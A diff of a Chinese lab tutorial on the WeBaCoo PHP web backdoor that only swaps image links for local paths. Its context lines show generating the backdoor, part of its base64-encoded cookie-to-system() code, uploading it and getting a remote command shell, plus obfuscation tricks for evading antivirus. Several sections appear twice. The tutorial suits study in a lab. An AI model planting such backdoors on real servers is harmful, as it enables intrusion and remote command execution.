@@ -29,7 +29,7 @@
 
 而其中，宿主机 Ubuntu 14.04 也能提供 PHP 运行环境，所以以下的环境，可以把宿主机 Ubuntu 当成目标靶机，也可以将 Metasploitable2 当成目标靶机。实验的演示以宿主机 Ubuntu 为靶机，有兴趣的同学，也可以尝试将 Metasploitable2 作为目标靶机。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481608459196.png-wm)
+![图片描述](../imgs/1481608459196.png-wm.png)
 
 
 ## 二、启动环境
@@ -47,7 +47,7 @@ ssh root@Kali
 ```
 **注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**其中 Kali 虚拟机的默认密码为 `toor`，如果一切顺利，你将会看到如下页面：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)
+![图片描述](../imgs/1481188145695.png-wm.png)
 
 ## 三、原理介绍
 
@@ -69,7 +69,7 @@ WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的
 
 首先先查看 WeBaCoo 的参数含义，在命令行终端中，输入命令 `webacoo -h` 可以查看工具帮助选项：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013582306.png-wm)
+![图片描述](../imgs/1481013582306.png-wm.png)
 
 后门程序脚本工具包 WebaCoo 常用的命令参数含义如下列表：
 
@@ -92,11 +92,11 @@ WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的
 webacoo  -g -o hello.php
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013914062.png-wm)
+![图片描述](../imgs/1481013914062.png-wm.png)
 
 使用 `ls` 命令查看当前目录下的文件，确认是否已经生成了木马文件：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013974754.png-wm)
+![图片描述](../imgs/1481013974754.png-wm.png)
 
 ### 4.2  PHP 木马源码原理解析
 
@@ -128,7 +128,7 @@ $b = "base64_decode";
 对于下面的经过 `base64` 加密过的字符串，并且每个字符之间混夹着一个空格，我们可以使用 `Python` 对字符串进行还原，显现出其真正的代码面目，加深对木马源码的理解（**注意：下面将代码反解的过程，不用在实验楼环境中操作，这里只是为了让同学们能够清晰地看到，由 WeBaCoo 创建的 PHP 木马的原本真实源码**）：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618443849.png-wm)
+![图片描述](../imgs/1481618443849.png-wm.png)
 
 首先先进行去掉空白空格的操作，得到经过 Base64 加密杂乱无序的字符串：
 
@@ -141,7 +141,7 @@ aWYoaXNzZXQoJF9DT09LSUVbJ2NtJ10pKXtvYl9zdGFydCgpO3N5c3RlbShiYXNlNjRfZGVjb2RlKCRf
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618755418.png-wm)
+![图片描述](../imgs/1481618755418.png-wm.png)
 
 引用 `Base64` 模块进行解密，得到攻击者的最初意图代码。由解密出来的代码，可以明显的看出，代码第一步先判断 Cookie 是否设置。这里我们再回顾下 WeBaCoo 是什么原理介绍部分。其中有如下这一句话，文档中指出了 Shell 命令编码后，隐藏在 Cookie 头中：
 
@@ -180,11 +180,11 @@ scp hello.php shiyanlou@192.168.122.1:/tmp
 ```
 **注意： 连接实验楼宿主主机的账号为 `shiyanlou`，对应的密码是 `shiyanlou`:**
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993526850.png-wm)
+![图片描述](../imgs/1480993526850.png-wm.png)
 
 实验楼 Ubuntu 环境下，默认开启的是 `nginx` 服务。在上传木马文件后，输入命令关掉 `nginx` 服务，开启 `apache2` 服务，用以测试 PHP 木马：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993507282.png-wm)
+![图片描述](../imgs/1480993507282.png-wm.png)
 
 ```
 # 关掉 nginx 服务程序
@@ -193,7 +193,7 @@ sudo service nginx stop
 # 开启 apache2 服务程序
 sudo service apache2 start
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993732499.png-wm)
+![图片描述](../imgs/1480993732499.png-wm.png)
 
 将木马文件，复制到网站的根目录下，这里注意，要加 `sudo` 权限：
 
@@ -212,7 +212,7 @@ webacoo -t -u http://192.168.122.1/hello.php
 
 成功之后，命令行前缀发生了变化，如下图所示：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014707333.png-wm)
+![图片描述](../imgs/1481014707333.png-wm.png)
 
 **注意：成功后终端前缀 `root@Kali:` 变成了 `webacoo$`**
 
@@ -234,7 +234,7 @@ ls
 ifconfig
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014938827.png-wm)
+![图片描述](../imgs/1481014938827.png-wm.png)
 
 
 ## 五、总结和思考
@@ -268,7 +268,7 @@ ifconfig
 
 而其中，宿主机 Ubuntu 14.04 也能提供 PHP 运行环境，所以以下的环境，可以把宿主机 Ubuntu 当成目标靶机，也可以将 Metasploitable2 当成目标靶机。实验的演示以宿主机 Ubuntu 为靶机，有兴趣的同学，也可以尝试将 Metasploitable2 作为目标靶机。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481608459196.png-wm)
+![图片描述](../imgs/1481608459196.png-wm.png)
 
 
 ## 二、启动环境
@@ -286,7 +286,7 @@ ssh root@Kali
 ```
 **注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**其中 Kali 虚拟机的默认密码为 `toor`，如果一切顺利，你将会看到如下页面：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)
+![图片描述](../imgs/1481188145695.png-wm.png)
 
 ## 三、原理介绍
 
@@ -308,7 +308,7 @@ WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的
 
 首先先查看 WeBaCoo 的参数含义，在命令行终端中，输入命令 `webacoo -h` 可以查看工具帮助选项：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013582306.png-wm)
+![图片描述](../imgs/1481013582306.png-wm.png)
 
 后门程序脚本工具包 WebaCoo 常用的命令参数含义如下列表：
 
@@ -331,11 +331,11 @@ WeBaCoo (Web Backdoor Cookie) 作为 web 后门程序脚本的工具包，目的
 webacoo  -g -o hello.php
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013914062.png-wm)
+![图片描述](../imgs/1481013914062.png-wm.png)
 
 使用 `ls` 命令查看当前目录下的文件，确认是否已经生成了木马文件：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481013974754.png-wm)
+![图片描述](../imgs/1481013974754.png-wm.png)
 
 ### 4.2  PHP 木马源码原理解析
 
@@ -367,7 +367,7 @@ $b = "base64_decode";
 对于下面的经过 `base64` 加密过的字符串，并且每个字符之间混夹着一个空格，我们可以使用 `Python` 对字符串进行还原，显现出其真正的代码面目，加深对木马源码的理解（**注意：下面将代码反解的过程，不用在实验楼环境中操作，这里只是为了让同学们能够清晰地看到，由 WeBaCoo 创建的 PHP 木马的原本真实源码**）：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618443849.png-wm)
+![图片描述](../imgs/1481618443849.png-wm.png)
 
 首先先进行去掉空白空格的操作，得到经过 Base64 加密杂乱无序的字符串：
 
@@ -380,7 +380,7 @@ aWYoaXNzZXQoJF9DT09LSUVbJ2NtJ10pKXtvYl9zdGFydCgpO3N5c3RlbShiYXNlNjRfZGVjb2RlKCRf
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481618755418.png-wm)
+![图片描述](../imgs/1481618755418.png-wm.png)
 
 引用 `Base64` 模块进行解密，得到攻击者的最初意图代码。由解密出来的代码，可以明显的看出，代码第一步先判断 Cookie 是否设置。这里我们再回顾下 WeBaCoo 是什么原理介绍部分。其中有如下这一句话，文档中指出了 Shell 命令编码后，隐藏在 Cookie 头中：
 
@@ -419,11 +419,11 @@ scp hello.php shiyanlou@192.168.122.1:/tmp
 ```
 **注意： 连接实验楼宿主主机的账号为 `shiyanlou`，对应的密码是 `shiyanlou`:**
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993526850.png-wm)
+![图片描述](../imgs/1480993526850.png-wm.png)
 
 实验楼 Ubuntu 环境下，默认开启的是 `nginx` 服务。在上传木马文件后，输入命令关掉 `nginx` 服务，开启 `apache2` 服务，用以测试 PHP 木马：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993507282.png-wm)
+![图片描述](../imgs/1480993507282.png-wm.png)
 
 ```
 # 关掉 nginx 服务程序
@@ -432,7 +432,7 @@ sudo service nginx stop
 # 开启 apache2 服务程序
 sudo service apache2 start
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480993732499.png-wm)
+![图片描述](../imgs/1480993732499.png-wm.png)
 
 将木马文件，复制到网站的根目录下，这里注意，要加 `sudo` 权限：
 
@@ -451,7 +451,7 @@ webacoo -t -u http://192.168.122.1/hello.php
 
 成功之后，命令行前缀发生了变化，如下图所示：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014707333.png-wm)
+![图片描述](../imgs/1481014707333.png-wm.png)
 
 **注意：成功后终端前缀 `root@Kali:` 变成了 `webacoo$`**
 
@@ -473,7 +473,7 @@ ls
 ifconfig
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481014938827.png-wm)
+![图片描述](../imgs/1481014938827.png-wm.png)
 
 
 ## 五、总结和思考
@@ -484,7 +484,7 @@ ifconfig
 
 创建 PHP 木马程序的思路为，先通过 strrev() 函数，对 Base64_decode 字符进行反转，接着对于 Base64 编码生成的字符串，使用空格混夹在代码里，欺骗免杀程序，提高木马的存活率。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481623151367.png-wm)
+![图片描述](../imgs/1481623151367.png-wm.png)
 
 ## 六、课后作业
 
@@ -508,7 +508,7 @@ ifconfig
 
 创建 PHP 木马程序的思路为，先通过 strrev() 函数，对 Base64_decode 字符进行反转，接着对于 Base64 编码生成的字符串，使用空格混夹在代码里，欺骗免杀程序，提高木马的存活率。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1481623151367.png-wm)
+![图片描述](../imgs/1481623151367.png-wm.png)
 
 ## 六、课后作业
 
